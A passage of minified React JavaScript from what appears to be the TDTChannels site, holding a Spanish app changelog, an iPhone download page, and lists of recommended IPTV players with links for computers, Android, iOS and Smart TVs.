"Estabilidad en general y correcciones en la visualizaci\xf3n de canales.", l.a.createElement("br", null), l.a.createElement("br", null), l.a.createElement("h4", null, "[v1.2.1] - 20 / 05 / 2020"), l.a.createElement("b", null, "- Correcci\xf3n de errores"), l.a.createElement("br", null), "Estabilidad en general y correcciones en el navegador integrado.", l.a.createElement("br", null), l.a.createElement("br", null), l.a.createElement("h4", null, "[v1.2.0] - 14 / 05 / 2020"), l.a.createElement("b", null, "- Navegador Integrado"), l.a.createElement("br", null), "Se ha integrado un navegador para poder seguir en directo los streams. De esta forma mejora adem\xe1s la compatibilidad con Android TV, ya que no depende de ning\xfan navegador externo.", l.a.createElement("br", null), l.a.createElement("b", null, "- Ajustes"), l.a.createElement("br", null), "Se ha incluido la posibilidad de realizar algunos ajustes en la aplicaci\xf3n. Por ejemplo si utilizar el navegador integrado, si rotar autom\xe1ticamente la pantalla o si se desea forzar el modo oscuro.", l.a.createElement("br", null), l.a.createElement("b", null, "- Listado de canales y emisoras"), l.a.createElement("br", null), "En dispositivos anchos, ahora hay cuatro columnas de elementos. Mientras que para dispositivos estrechos, siguen siendo dos.", l.a.createElement("br", null), l.a.createElement("b", null, "- Posibilidad de Stream Web"), l.a.createElement("br", null), "Ahora se incluye la propia web como posibilidad de Stream.", l.a.createElement("br", null), l.a.createElement("b", null, "- Mejoras para Android 4.4"), l.a.createElement("br", null), "Corregido un error que hac\xeda no poder seleccionar canales en Android 4.4. Aunque no se ve visualmente, el canal se selecciona y se puede acceder a \xe9l.", l.a.createElement("br", null), l.a.createElement("b", null, "- Correcci\xf3n de errores"), l.a.createElement("br", null), "Solucionados algunos errores que imposibilitaban la reproducci\xf3n de Streams de Youtube. Ahora no se rota autom\xe1ticamente la pantalla, no forz\xe1ndola as\xed a ver la reproducci\xf3n en apaisado.", l.a.createElement("br", null), l.a.createElement("b", null, "- Correcciones visuales"), l.a.createElement("br", null), "Peque\xf1as mejoras en el listado de canales y disposici\xf3n de los mismos. Adem\xe1s de retoques en general.", l.a.createElement("br", null), l.a.createElement("br", null), l.a.createElement("h4", null, "[v1.1.1] - 26 / 04 / 2020"), l.a.createElement("b", null, "- Correcci\xf3n de errores"), l.a.createElement("br", null), "Solucionados errores de incompatibilidad con terminales antiguos, principalmente Android 4.4 y Android 5.", l.a.createElement("br", null), l.a.createElement("b", null, "- Pantalla de carga"), l.a.createElement("br", null), "A\xf1adida para que la carga principal se haga en la Splash. As\xed el uso ser\xe1 m\xe1s fluido.", l.a.createElement("br", null), l.a.createElement("br", null), l.a.createElement("h4", null, "[v1.1.0] - 25 / 04 / 2020"), l.a.createElement("b", null, "- Radio: Nuevo reproductor en la barra de notificaciones"), l.a.createElement("br", null), "Incorporaci\xf3n del reproductor de radio en la barra de Notificaciones.", l.a.createElement("br", null), l.a.createElement("b", null, "- Radio: Correcciones"), l.a.createElement("br", null), "Solucionado un error en el reproductor, que hac\xeda que la reproducci\xf3n se parase a los 3 - 5 minutos. Mejorada la identificacion de emisiones.", l.a.createElement("br", null), l.a.createElement("b", null, "- TV: Correcciones"), l.a.createElement("br", null), "Mejoras en el reproductor de TV. Mejorada la identificacion de emisiones.", l.a.createElement("br", null), l.a.createElement("b", null, "- Android TV"), l.a.createElement("br", null), "Integraci\xf3n completa. El logo ya aparece en el men\xfa una vez instalada la aplicaci\xf3n.", l.a.createElement("br", null), l.a.createElement("b", null, "- Actualizaci\xf3n de librer\xedas"), l.a.createElement("br", null), "Exoplayer actualizada a 2.11.4.", l.a.createElement("br", null), l.a.createElement("br", null), l.a.createElement("h4", null, "[v1.0.0] - 02 / 04 / 2020"), l.a.createElement("b", null, "- Nuevo reproductor de radio"), l.a.createElement("br", null), "Incorporaci\xf3n de un reproductor de radio, ahora permite para la reproducci\xf3n y pausa desde la misma pesta\xf1a.", l.a.createElement("br", null), l.a.createElement("b", null, "- Reproductor de v\xeddeo"), l.a.createElement("br", null), "Ahora reproduce en modo inmersivo, la reproducci\xf3n ocupa toda la pantalla.", l.a.createElement("br", null), l.a.createElement("b", null, "- Redise\xf1o visual"), l.a.createElement("br", null), "Retoques en las ventanas principales de la aplicaci\xf3n, sacando informaci\xf3n innecesaria y dando m\xe1s \xe9nfasis a la informaci\xf3n que importa. Mayor informaci\xf3n antes de reproducir un canal. Ahora te informa si un canal es Geolocalizado o si emite en otro idioma o su calidad de reproducci\xf3n. A\xf1adidas cabeceras de categor\xedas de los canales. Mensaje visual para avisar si la lista no se ha descargado correctamente.", l.a.createElement("br", null), l.a.createElement("b", null, "- Dark Mode"), l.a.createElement("br", null), "La aplicaci\xf3n se adapta si tu tel\xe9fono est\xe1 funcionando en modo oscuro.", l.a.createElement("br", null), l.a.createElement("b", null, "- Android TV"), l.a.createElement("br", null), "Arreglados los fallos visuales que hab\xeda con Android TV. Los canales se ven resaltados al seleccionarlos.", l.a.createElement("br", null), l.a.createElement("b", null, "- Actualizaci\xf3n de librer\xedas"), l.a.createElement("br", null), "Exoplayer actualizada a 2.11.3.", l.a.createElement("br", null), l.a.createElement("b", null, "- Eliminado Gallego"), l.a.createElement("br", null), "Como idioma de la aplicaci\xf3n. Nadie le ha estado dando soporte hasta ahora, \xfanicamente yo, y no tengo conocimientos de gallego.", l.a.createElement("br", null), l.a.createElement("b", null, "- Closed source"), l.a.createElement("br", null), "La aplicaci\xf3n ya no tiene el c\xf3digo fuente p\xfablico. Hace un tiempo publiqu\xe9 los motivos. Igualmente recalcar que el objetivo de hacerla cerrada es dificultar que la gente haga clones de mi aplicaci\xf3n. Hasta ahora lo permit\xeda, citandome, pero todo el mundo se lo ha pasado por el forro y nadie me llegaba a citar.", l.a.createElement("br", null))
                        }
                    }]), t
                }(l.a.Component),
                de = function(e) {
                    Object(m.a)(t, e);
                    var a = Object(u.a)(t);

                    function t(e) {
                        var n;
                        return Object(s.a)(this, t), (n = a.call(this, e)).state = {}, n
                    }
                    return Object(c.a)(t, [{
                        key: "componentDidMount",
                        value: function() {}
                    }, {
                        key: "render",
                        value: function() {
                            return l.a.createElement(me.a, {
                                style: {
                                    paddingTop: "20px",
                                    paddingBottom: "30px"
                                }
                            }, l.a.createElement("h1", null, "\xa1Estamos en iPhone!"), l.a.createElement("p", null, "Desde aqu\xed puedes descargarte la \xfaltima versi\xf3n de la aplicaci\xf3n iPhone oficial para este proyecto!"), l.a.createElement("h2", null, "Funcionalidades"), l.a.createElement("h3", null, "Reproduce"), "Reproduce todos tus canales favoritos de \xe1mbito Espa\xf1ol e Internacional m\xe1s populares. Tanto de televisi\xf3n como radio! ", l.a.createElement("br", null), l.a.createElement("h3", null, "Selecciona"), "Selecciona tus canales favoritos para un acceso r\xe1pido. Y adem\xe1s puedes filtrar por comunidades aut\xf3nomas o paises.", l.a.createElement("h3", null, "\xa1Disfruta!"), "De todo el contenido, sin publicidad y de forma totalmente gratuita!", l.a.createElement("br", null), l.a.createElement("br", null), l.a.createElement(v.a, {
                                container: !0,
                                spacing: 3,
                                justify: "center"
                            }, l.a.createElement(v.a, {
                                item: !0,
                                xs: 12,
                                sm: 10,
                                md: 3
                            }, l.a.createElement("img", {
                                className: "screenshot-front",
                                src: "".concat("", "/tdtchannels_iphone_1.jpg"),
                                alt: "TDTChannels Captura Televisi\xf3n"
                            })), l.a.createElement(v.a, {
                                item: !0,
                                xs: 12,
                                sm: 10,
                                md: 3
                            }, l.a.createElement("img", {
                                className: "screenshot-front",
                                src: "".concat("", "/tdtchannels_iphone_2.jpg"),
                                alt: "TDTChannels Captura Radio"
                            }))), l.a.createElement("br", null), l.a.createElement("h3", null, "Pasos para instalaci\xf3n"), l.a.createElement("p", null, "1- ", l.a.createElement("b", null, "Descarga"), " e ", l.a.createElement("b", null, "instala"), " en tu dispositivo. ", l.a.createElement("br", null), "2- A\xf1ade las", " ", l.a.createElement("a", {
                                href: "https://tbearsoftware.es/apps/ios/tdtchannels/",
                                target: "_blank",
                                rel: "nofollow noopener noreferrer"
                            }, "listas JSON"), " ", "que desees.", l.a.createElement("br", null), "3- ", l.a.createElement("b", null, "\xa1Disfruta!")), l.a.createElement("h3", null, "Compatibilidades"), l.a.createElement("p", null, "- ", l.a.createElement("b", null, "iPhone"), ", ", l.a.createElement("b", null, "iPad"), " y ", l.a.createElement("b", null, "iPod"), ": Requiere iOS 13.0 o posterior.", l.a.createElement("br", null), "- ", l.a.createElement("b", null, "MacOS"), ": Requiere macOS 10.15 o posterior."), l.a.createElement("h3", null, "Descargar TDTChannels"), l.a.createElement("p", null, "Esta versi\xf3n incluye las \xfaltimas novedades que", " ", l.a.createElement("a", {
                                href: "https://tbearsoftware.es/",
                                target: "_blank",
                                rel: "nofollow noopener noreferrer"
                            }, "Jacobo (@Jako88)"), " ", "ha preparado para vosotros!"), l.a.createElement(y.a, {
                                href: "https://apps.apple.com/es/app/tdtchannels-2/id1511466333#?platform=iphone",
                                color: "primary",
                                target: "_blank",
                                rel: "nofollow noopener noreferrer"
                            }, "Descarga desde Apple Store"), l.a.createElement("br", null), l.a.createElement("br", null), l.a.createElement("h3", null, "Alternativas "), "Como somos un proyecto abierto, dispon\xe9is de m\xe1s alternativas en el apartado", " ", l.a.createElement("a", {
                                href: "".concat("", "/otrasplataformas")
                            }, "Otras Plataformas."))
                        }
                    }]), t
                }(l.a.Component),
                pe = t(116),
                Ee = t(237),
                be = t(245),
                he = t(238),
                ge = t(242),
                fe = (t(69), function(e) {
                    Object(m.a)(t, e);
                    var a = Object(u.a)(t);

                    function t() {
                        return Object(s.a)(this, t), a.apply(this, arguments)
                    }
                    return Object(c.a)(t, [{
                        key: "render",
                        value: function() {
                            return l.a.createElement("div", {
                                className: "section"
                            }, l.a.createElement("h2", null, "Ordenador"), "Los enlaces y las listas funcionan por defecto en cualquier reproductor. Pero a continuaci\xf3n os dejamos los m\xe1s utilizados.", l.a.createElement("div", {
                                className: "subsection"
                            }, l.a.createElement("div", {
                                className: "subsubsection"
                            }, l.a.createElement("h4", null, "TDTChannels + BlueStacks"), l.a.createElement("b", null, "Formato de listas compatibles"), ": Todas las del proyecto ya est\xe1n incluidas.", l.a.createElement("br", null), l.a.createElement("b", null, "Gu\xeda EPG"), ": Si", l.a.createElement("br", null), l.a.createElement("b", null, "Soporte"), ": Aplicaci\xf3n oficial", l.a.createElement("br", null), l.a.createElement("b", null, "Sistemas compatibles"), ": ", l.a.createElement("em", null, "Windows"), ", ", l.a.createElement("em", null, "Chromebook"), " (No hace falta emulador)", l.a.createElement("br", null), l.a.createElement("b", null, "Descarga"), ":", " ", l.a.createElement("a", {
                                href: "".concat("", "/android"),
                                target: "_blank",
                                rel: "noopener noreferrer"
                            }, "TDTChannels"), l.a.createElement("br", null), l.a.createElement("div", {
                                className: "description"
                            }, "Reproductor oficial, todo ", l.a.createElement("b", null, "listo para descargar y disfrutar"), ". Gratis, sin publicidad, y le damos soporte en nuestro grupo de Telegram. Para utilizarlo deber\xe1s descargar BlueStacks, un emulador de Android para PC. Aqu\xed tienes una gu\xeda detallada que ha realizado el usuario David Fabregat para que puedas disfrutarlo.", " ", l.a.createElement("a", {
                                href: "https://telegra.ph/Gu%C3%ADa-B%C3%A1sica-para-usar-la-app-TDTChannels-en-un-ordenador-Emulador-BlueStacks-07-23",
                                target: "_blank",
                                rel: "nofollow noopener noreferrer"
                            }, "Gu\xeda B\xe1sica para usar la app TDTChannels en un ordenador: Emulador BlueStacks"))), l.a.createElement("div", {
                                className: "subsubsection"
                            }, l.a.createElement("h4", null, "VLC"), l.a.createElement("b", null, "Formato de listas compatibles"), ": ", l.a.createElement("em", null, "m3u"), " y ", l.a.createElement("em", null, "m3u8"), " ", l.a.createElement("br", null), l.a.createElement("b", null, "Gu\xeda EPG"), ": No", l.a.createElement("br", null), l.a.createElement("b", null, "Soporte"), ": No", l.a.createElement("br", null), l.a.createElement("b", null, "Sistemas compatibles"), ": ", l.a.createElement("em", null, "Windows"), ", ", l.a.createElement("em", null, "macOS"), " y", " ", l.a.createElement("em", null, "Linux"), l.a.createElement("br", null), l.a.createElement("b", null, "Descarga"), ":", " ", l.a.createElement("a", {
                                href: "https://www.videolan.org/vlc/index.es.html",
                                target: "_blank",
                                rel: "nofollow noopener noreferrer"
                            }, "VLC"), l.a.createElement("br", null), l.a.createElement("div", {
                                className: "description"
                            }, "Aqu\xed ten\xe9is una gu\xeda a modo de tutorial para disfrutar de este modo de reproducci\xf3n.", " ", l.a.createElement("a", {
                                href: "https://www.softzone.es/2016/12/18/ver-la-tdt-online-streaming-utilizando-tan-solo-vlc",
                                target: "_blank",
                                rel: "nofollow noopener noreferrer"
                            }, "Ver la TDT online streaming utilizando VLC (Softzone)"))), l.a.createElement("div", {
                                className: "subsubsection"
                            }, l.a.createElement("h4", null, "MyIPTV"), l.a.createElement("b", null, "Formato de listas compatibles"), ": ", l.a.createElement("em", null, "m3u"), " y ", l.a.createElement("em", null, "m3u8"), " ", l.a.createElement("br", null), l.a.createElement("b", null, "Gu\xeda EPG"), ": S\xed", l.a.createElement("br", null), l.a.createElement("b", null, "Soporte"), ": No", l.a.createElement("br", null), l.a.createElement("b", null, "Sistemas compatibles"), ": ", l.a.createElement("em", null, "Windows"), l.a.createElement("br", null), l.a.createElement("b", null, "Descarga"), ":", " ", l.a.createElement("a", {
                                href: "https://www.microsoft.com/en-us/p/myiptv-player/9pjj2nmbf0tr",
                                target: "_blank",
                                rel: "nofollow noopener noreferrer"
                            }, "Microsoft Store"), l.a.createElement("br", null), l.a.createElement("div", {
                                className: "description"
                            }, "Este es un programa gratuito que se puede descargar desde la Microsoft Store. Adem\xe1s, el usuario @baenac2002 ha creado un", " ", l.a.createElement("a", {
                                href: "https://www.youtube.com/watch?v=Vuhn7X5nDAs",
                                target: "_blank",
                                rel: "nofollow noopener noreferrer"
                            }, "magn\xedfico tutorial en YouTube"), " ", "para poder instalarlo, y as\xed disfrutar de esta lista y de su programaci\xf3n.")), l.a.createElement("div", {
                                className: "subsubsection"
                            }, l.a.createElement("h4", null, "TDTChannels"), l.a.createElement("b", null, "Formato de listas compatibles"), ": ", l.a.createElement("em", null, "json"), l.a.createElement("br", null), l.a.createElement("b", null, "Gu\xeda EPG"), ": Si", l.a.createElement("br", null), l.a.createElement("b", null, "Soporte"), ": Aplicaci\xf3n oficial", l.a.createElement("br", null), l.a.createElement("b", null, "Sistemas compatibles"), ": ", l.a.createElement("em", null, "macOS"), l.a.createElement("br", null), l.a.createElement("b", null, "Descarga"), ":", " ", l.a.createElement("a", {
                                href: "https://tbearsoftware.es/apps/ios/tdtchannels/",
                                target: "_blank",
                                rel: "noopener noreferrer"
                            }, "Apple Store"), l.a.createElement("br", null), l.a.createElement("div", {
                                className: "description"
                            }, "Creado por", " ", l.a.createElement("a", {
                                href: "https://tbearsoftware.es/",
                                target: "_blank",
                                rel: "nofollow noopener noreferrer"
                            }, "Jacobo (@Jako88)"), ". Descargar y disfrutar. \xdanicamente deber\xe1s a\xf1adir la lista .json. Es gratis, sin publicidad, y le damos soporte en nuestro grupo de Telegram.")), l.a.createElement("div", {
                                className: "subsubsection"
                            }, l.a.createElement("h4", null, "IPTV (M3U8) List Player"), l.a.createElement("b", null, "Formato de listas compatibles"), ": ", l.a.createElement("em", null, "m3u"), " y ", l.a.createElement("em", null, "m3u8"), " ", l.a.createElement("br", null), l.a.createElement("b", null, "Gu\xeda EPG"), ": Si", l.a.createElement("br", null), l.a.createElement("b", null, "Soporte"), ": Si", l.a.createElement("br", null), l.a.createElement("b", null, "Sistemas compatibles"), ": ", l.a.createElement("em", null, "macOS"), l.a.createElement("br", null), l.a.createElement("b", null, "Descarga"), ":", " ", l.a.createElement("a", {
                                href: "https://apps.apple.com/es/app/iptv-m3u8-list-player/id1495585741",
                                target: "_blank",
                                rel: "nofollow noopener noreferrer"
                            }, "Apple Store"), l.a.createElement("br", null), l.a.createElement("div", {
                                className: "description"
                            }, "Creado por", " ", l.a.createElement("a", {
                                href: "https://ruben.app/",
                                target: "_blank",
                                rel: "nofollow noopener noreferrer"
                            }, "RubenApps"), ". Es gratis, sin publicidad, y le damos soporte en nuestro grupo de Telegram. Y un", " ", l.a.createElement("a", {
                                href: "https://telegra.ph/Configuraci%C3%B3n-de-IPTVPlayer-con-canales-TDT-02-17",
                                target: "_blank",
                                rel: "nofollow noopener noreferrer"
                            }, "tutorial"), " ", "en caso de dudas de uso."))))
                        }
                    }]), t
                }(n.Component)),
                ve = function(e) {
                    Object(m.a)(t, e);
                    var a = Object(u.a)(t);

                    function t() {
                        return Object(s.a)(this, t), a.apply(this, arguments)
                    }
                    return Object(c.a)(t, [{
                        key: "render",
                        value: function() {
                            return l.a.createElement("div", {
                                className: "section"
                            }, l.a.createElement("h2", null, "Android"), "Los enlaces y las listas funcionan por defecto en cualquier reproductor. Pero a continuaci\xf3n os dejamos los m\xe1s utilizados.", l.a.createElement("div", {
                                className: "subsection"
                            }, l.a.createElement("div", {
                                className: "subsubsection"
                            }, l.a.createElement("h4", null, "TDTChannels"), l.a.createElement("b", null, "Formato de listas compatibles"), ": Todas las del proyecto ya est\xe1n incluidas.", l.a.createElement("br", null), l.a.createElement("b", null, "Gu\xeda EPG"), ": S\xed ", l.a.createElement("br", null), l.a.createElement("b", null, "Soporte"), ": Aplicaci\xf3n oficial", l.a.createElement("br", null), l.a.createElement("b", null, "Descarga"), ":", " ", l.a.createElement("a", {
                                href: "".concat("", "/android"),
                                target: "_blank",
                                rel: "noopener noreferrer"
                            }, "TDTChannels"), l.a.createElement("br", null), l.a.createElement("div", {
                                className: "description"
                            }, "Reproductor oficial, todo ", l.a.createElement("b", null, "listo para descargar y disfrutar"), ". Gratis, sin publicidad, y le damos soporte en nuestro grupo de Telegram.")), l.a.createElement("div", {
                                className: "subsubsection"
                            }, l.a.createElement("h4", null, "Dimplay"), l.a.createElement("b", null, "Formato de listas compatibles"), ": ", l.a.createElement("em", null, "w3u"), l.a.createElement("br", null), l.a.createElement("b", null, "Gu\xeda EPG"), ": Si", l.a.createElement("br", null), l.a.createElement("b", null, "Soporte"), ": No", l.a.createElement("br", null), l.a.createElement("b", null, "Descarga"), ":", " ", l.a.createElement("a", {
                                href: "https://play.google.com/store/apps/details?id=com.iptv3u",
                                target: "_blank",
                                rel: "nofollow noopener noreferrer"
                            }, "Google Play"), l.a.createElement("br", null)), l.a.createElement("div", {
                                className: "subsubsection"
                            }, l.a.createElement("h4", null, "Wiseplay"), l.a.createElement("b", null, "Formato de listas compatibles"), ": ", l.a.createElement("em", null, "w3u"), " ", l.a.createElement("br", null), l.a.createElement("b", null, "Gu\xeda EPG"), ": No", l.a.createElement("br", null), l.a.createElement("b", null, "Soporte"), ": No", l.a.createElement("br", null), l.a.createElement("b", null, "Descarga"), ":", " ", l.a.createElement("a", {
                                href: "https://play.google.com/store/apps/details?id=com.wiseplay",
                                target: "_blank",
                                rel: "nofollow noopener noreferrer"
                            }, "Google Play"), l.a.createElement("br", null)), l.a.createElement("div", {
                                className: "subsubsection"
                            }, l.a.createElement("h4", null, "VLC"), l.a.createElement("b", null, "Formato de listas compatibles"), ": ", l.a.createElement("em", null, "m3u"), " y ", l.a.createElement("em", null, "m3u8"), " ", l.a.createElement("br", null), l.a.createElement("b", null, "Gu\xeda EPG"), ": No", l.a.createElement("br", null), l.a.createElement("b", null, "Soporte"), ": No", l.a.createElement("br", null), l.a.createElement("b", null, "Descarga"), ":", " ", l.a.createElement("a", {
                                href: "https://play.google.com/store/apps/details?id=org.videolan.vlc",
                                target: "_blank",
                                rel: "nofollow noopener noreferrer"
                            }, "Google Play"), l.a.createElement("br", null)), l.a.createElement("div", {
                                className: "subsubsection"
                            }, l.a.createElement("h4", null, "VideoTime"), l.a.createElement("b", null, "Formato de listas compatibles"), ": ", l.a.createElement("em", null, "m3u"), " y ", l.a.createElement("em", null, "m3u8"), " ", l.a.createElement("br", null), l.a.createElement("b", null, "Gu\xeda EPG"), ": No", l.a.createElement("br", null), l.a.createElement("b", null, "Soporte"), ": No", l.a.createElement("br", null), l.a.createElement("b", null, "Descarga"), ":", " ", l.a.createElement("a", {
                                href: "https://play.google.com/store/apps/details?id=com.aleapps.videotime",
                                target: "_blank",
                                rel: "nofollow noopener noreferrer"
                            }, "Google Play"))))
                        }
                    }]), t
                }(n.Component),
                ye = function(e) {
                    Object(m.a)(t, e);
                    var a = Object(u.a)(t);

                    function t() {
                        return Object(s.a)(this, t), a.apply(this, arguments)
                    }
                    return Object(c.a)(t, [{
                        key: "render",
                        value: function() {
                            return l.a.createElement("div", {
                                className: "section"
                            }, l.a.createElement("h2", null, "iOS"), "Los enlaces y las listas funcionan por defecto en cualquier reproductor. Pero a continuaci\xf3n os dejamos los m\xe1s utilizados.", l.a.createElement("div", {
                                className: "subsection"
                            }, l.a.createElement("div", {
                                className: "subsubsection"
                            }, l.a.createElement("h4", null, "TDTChannels"), l.a.createElement("b", null, "Formato de listas compatibles"), ": ", l.a.createElement("em", null, "json"), l.a.createElement("br", null), l.a.createElement("b", null, "Gu\xeda EPG"), ": Si", l.a.createElement("br", null), l.a.createElement("b", null, "Soporte"), ": Aplicaci\xf3n oficial", l.a.createElement("br", null), l.a.createElement("b", null, "Descarga"), ":", " ", l.a.createElement("a", {
                                href: "".concat("", "/iphone"),
                                target: "_blank",
                                rel: "noopener noreferrer"
                            }, "Apple Store"), l.a.createElement("br", null), l.a.createElement("div", {
                                className: "description"
                            }, "Creado por", " ", l.a.createElement("a", {
                                href: "https://tbearsoftware.es/",
                                target: "_blank",
                                rel: "nofollow noopener noreferrer"
                            }, "Jacobo (@Jako88)"), ". Descargar y disfrutar. \xdanicamente deber\xe1s a\xf1adir la lista .json, en el link de descarga tienes los pasos a seguir. Es gratis, sin publicidad, y le damos soporte en nuestro grupo de Telegram.")), l.a.createElement("div", {
                                className: "subsubsection"
                            }, l.a.createElement("h4", null, "IPTV (M3U8) List Player"), l.a.createElement("b", null, "Formato de listas compatibles"), ": ", l.a.createElement("em", null, "m3u"), " y ", l.a.createElement("em", null, "m3u8"), " ", l.a.createElement("br", null), l.a.createElement("b", null, "Gu\xeda EPG"), ": Si", l.a.createElement("br", null), l.a.createElement("b", null, "Soporte"), ": Si", l.a.createElement("br", null), l.a.createElement("b", null, "Descarga"), ":", " ", l.a.createElement("a", {
                                href: "https://apps.apple.com/es/app/iptv-m3u8-list-player/id1495585741",
                                target: "_blank",
                                rel: "nofollow noopener noreferrer"
                            }, "Apple Store"), l.a.createElement("br", null), l.a.createElement("div", {
                                className: "description"
                            }, "Creado por", " ", l.a.createElement("a", {
                                href: "https://ruben.app/",
                                target: "_blank",
                                rel: "nofollow noopener noreferrer"
                            }, "RubenApps"), ". Es gratis, sin publicidad, y le damos soporte en nuestro grupo de Telegram. Y un", " ", l.a.createElement("a", {
                                href: "https://telegra.ph/Configuraci%C3%B3n-de-IPTVPlayer-con-canales-TDT-02-17",
                                target: "_blank",
                                rel: "nofollow noopener noreferrer"
                            }, "tutorial"), " ", "en caso de dudas de uso."))))
                        }
                    }]), t
                }(n.Component),
                we = function(e) {
                    Object(m.a)(t, e);
                    var a = Object(u.a)(t);

                    function t() {
                        return Object(s.a)(this, t), a.apply(this, arguments)
                    }
                    return Object(c.a)(t, [{
                        key: "render",
                        value: function() {
                            return l.a.createElement("div", {
                                className: "section"
                            }, l.a.createElement("h2", null, "Smart TV"), "Los enlaces y las listas funcionan por defecto en cualquier reproductor. Pero a continuaci\xf3n os dejamos los m\xe1s utilizados.", l.a.createElement("div", {
                                className: "subsection"
                            }, l.a.createElement("h3", null, "Android TV"), l.a.createElement("div", {
                                className: "subsubsection"
                            }, l.a.createElement("h4", null, "TDTChannels"), l.a.createElement("b", null, "Formato de listas compatibles"), ": Todas las del proyecto ya est\xe1n incluidas.", l.a.createElement("br", null), l.a.createElement("b", null, "Gu\xeda EPG"), ": Si", l.a.createElement("br", null), l.a.createElement("b", null, "Soporte"), ": Aplicaci\xf3n oficial", l.a.createElement("br", null), l.a.createElement("b", null, "Descarga"), ":", " ", l.a.createElement("a", {
                                href: "".concat("", "/android"),
                                target: "_blank",
                                rel: "noopener noreferrer"
                            }, "TDTChannels"), l.a.createElement("br", null), l.a.createElement("div", {
                                className: "description"
                            }, "Este es nuestro reproductor oficial. ", l.a.createElement("b", null, "Todo preparado"), " para descargarla y disfrutar. Es gratis, sin publicidad, y le damos soporte en nuestro grupo de Telegram. Debes descargar la aplicaci\xf3n en otro dispositivo y copiarla al Android TV v\xeda USB o alg\xfan otro m\xe9todo.", l.a.createElement("br", null), "Si no sabes como enviar el APK a la televisi\xf3n, aqu\xed tienes un", " ", l.a.createElement("a", {
                                href: "https://www.youtube.com/watch?v=LTii64oZrhQ",
                                target: "_blank",
                                rel: "nofollow noopener noreferrer"
                            }, "tutorial."), " ", "Hecho por el usuario @PacoDevelop con la explicaci\xf3n."))), l.a.createElement("div", {
                                className: "subsection"
                            }, l.a.createElement("h3", null, "Apple TV"), l.a.createElement("div", {
                                className: "subsubsection"
                            }, l.a.createElement("h4", null, "IPTV (M3U8) List Player"), l.a.createElement("b", null, "Formato de listas compatibles"), ": ", l.a.createElement("em", null, "m3u"), " y ", l.a.createElement("em", null, "m3u8"), " ", l.a.createElement("br", null), l.a.createElement("b", null, "Gu\xeda EPG"), ": Si", l.a.createElement("br", null), l.a.createElement("b", null, "Soporte"), ": Si", l.a.createElement("br", null), l.a.createElement("b", null, "Descarga"), ":", " ", l.a.createElement("a", {
                                href: "https://apps.apple.com/es/app/iptv-m3u8-list-player/id1495585741",
                                target: "_blank",
                                rel: "nofollow noopener noreferrer"
                            }, "Apple Store"), l.a.createElement("br", null), l.a.createElement("div", {
                                className: "description"
                            }, "Creado por", " ", l.a.createElement("a", {
                                href: "https://ruben.app/",
                                target: "_blank",
                                rel: "nofollow noopener noreferrer"
                            }, "RubenApps"), ". Es gratis, sin publicidad, y le damos soporte en nuestro grupo de Telegram. Y un", " ", l.a.createElement("a", {
                                href: "https://telegra.ph/Configuraci%C3%B3n-de-IPTVPlayer-con-canales-TDT-02-17",
                                target: "_blank",
                                rel: "nofollow noopener noreferrer"
                            }, "tutorial"), " ", "en caso de dudas de uso.")), l.a.createElement("div", {
                                className: "subsubsection"
                            }, l.a.createElement("h4", null, "VidLib"), l.a.createElement("b", null, "Formato de listas compatibles"), ": ", l.a.createElement("em", null, "m3u"), " y ", l.a.createElement("em", null, "m3u8"), " ", l.a.createElement("br", null), l.a.createElement("b", null, "Gu\xeda EPG"), ": Si, en su versi\xf3n de pago.", l.a.createElement("br", null), l.a.createElement("b", null, "Soporte"), ": No", l.a.createElement("br", null), l.a.createElement("b", null, "Descarga"), ":", " ", l.a.createElement("a", {
                                href: "https://apps.apple.com/es/app/vidlib/id1067149728",
                                target: "_blank",
                                rel: "nofollow noopener noreferrer"
                            }, "Apple Store"), l.a.createElement("br", null), l.a.createElement("div", {
                                className: "description"
                            }, "Disponen adem\xe1s de grupo de", " ", l.a.createElement("a", {
                                href: "https://t.me/vidlib2chat",
                                target: "_blank",
                                rel: "nofollow noopener noreferrer"
                            }, "Telegram"), " ", "para resolver dudas.")), l.a.createElement("div", {
                                className: "subsubsection"
                            }, l.a.createElement("h4", null, "GSE"), l.a.createElement("b", null, "Formato de listas compatibles"), ": ", l.a.createElement("em", null, "m3u"), " y ", l.a.createElement("em", null, "m3u8"), " ", l.a.createElement("br", null), l.a.createElement("b", null, "Gu\xeda EPG"), ": \xbf?", l.a.createElement("br", null), l.a.createElement("b", null, "Soporte"), ": No", l.a.createElement("br", null), l.a.createElement("b", null, "Descarga"), ":", " ", l.a.createElement("a", {
                                href: "https://apps.apple.com/es/app/gse-smart-iptv/id1028734023",
                                target: "_blank",
                                rel: "nofollow noopener noreferrer"
                            }, "Apple Store"), l.a.createElement("br", null), l.a.createElement("div", {
                                className: "description"
                            }, "Con marca de agua en su versi\xf3n gratuita."))), l.a.createElement("div", {
                                className: "subsection"
                            }, l.a.createElement("h3", null, "Fire TV"), l.a.createElement("div", {
                                className: "subsubsection"
                            }, l.a.createElement("h4", null, "TDTChannels"), l.a.createElement("b", null, "Formato de listas compatibles"), ": Todas las del proyecto ya est\xe1n incluidas.", l.a.createElement("br", null), l.a.createElement("b", null, "Gu\xeda EPG"), ": Si", l.a.createElement("br", null), l.a.createElement("b", null, "Soporte"), ": Aplicaci\xf3n oficial", l.a.createElement("br", null), l.a.createElement("b", null, "Descarga"), ":", " ", l.a.createElement("a", {
                                href: "".concat("", "/android"),
                                target: "_blank",
                                rel: "noopener noreferrer"
                            }, "TDTChannels"), l.a.createElement("br", null), l.a.createElement("div", {
                                className: "description"
                            }, "Reproductor oficial, todo ", l.a.createElement("b", null, "listo para descargar y disfrutar"), ". Gratis, sin publicidad, y le damos soporte en nuestro grupo de Telegram.", l.a.createElement("br", null), "Est\xe1 preparada para funcionar en Fire TV. Sin embargo (temporalmente) el funcionamiento no es correcto a no ser que tengas un rat\xf3n virtual instalado. Tutoriales hechos por el usuario 'cansat'.", " ", l.a.createElement("a", {
                                href: "https://telegra.ph/Instalar-apk-de-movil-en-el-fire-y-como-manejarlo-11-28",
                                target: "_blank",
                                rel: "nofollow noopener noreferrer"
                            }, "Instalar apk de movil en el fire tv stick, como manejarlo y verlo bien"), " ", "y", " ", l.a.createElement("a", {
                                href: "https://telegra.ph/TDTchannels-en-el-fire-tv-stick-basic-y-4k-07-17",
                                target: "_blank",
                                rel: "nofollow noopener noreferrer"
                            }, "TDTchannels en el fire tv stick basic y 4k."))), l.a.createElement("div", {
                                className: "subsubsection"
